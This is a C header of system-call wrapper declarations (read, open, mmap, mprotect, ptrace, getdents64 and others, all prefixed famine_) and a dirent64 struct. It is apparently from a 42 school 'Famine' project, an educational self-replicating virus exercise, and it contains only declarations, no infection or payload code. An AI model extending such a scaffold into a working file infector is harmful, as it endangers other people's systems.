/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   syscall.h                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: jfortin <jfortin@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/06/04 22:36:02 by jfortin           #+#    #+#             */
/*   Updated: 2019/06/07 03:51:23 by agrumbac         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef SYSCALL_PRIVATE
# define SYSCALL_PRIVATE

#include <linux/unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <dirent.h>
#include <sys/ptrace.h>

/*
** file data
*/

struct dirent64
{
    __ino64_t d_ino;
    __off64_t d_off;
    unsigned short int d_reclen;
    unsigned char d_type;
    char d_name[256];                /* We must not include limits.h! */
};

/*
** syscalls
*/

ssize_t		famine_read(int fd, void *buf, size_t count);
ssize_t		famine_write(int fd, const void *buf, size_t count);
int		famine_open(const char *pathname, int flags, ...);
int		famine_close(int fd);
int		famine_fstat(int fd, struct stat *statbuf);
void		*famine_mmap(void *addr, size_t length, int prot, int flags, \
				int fd, off_t offset);
int		famine_mprotect(void *addr, size_t len, int prot);
int		famine_munmap(void *addr, size_t length);
int     	famine_exit(int status);
long		famine_ptrace(enum __ptrace_request request, pid_t pid, \
				void *addr, void *data);
int		famine_getdents64(unsigned int fd, struct dirent64 *dirp, \
				unsigned int count);

#endif
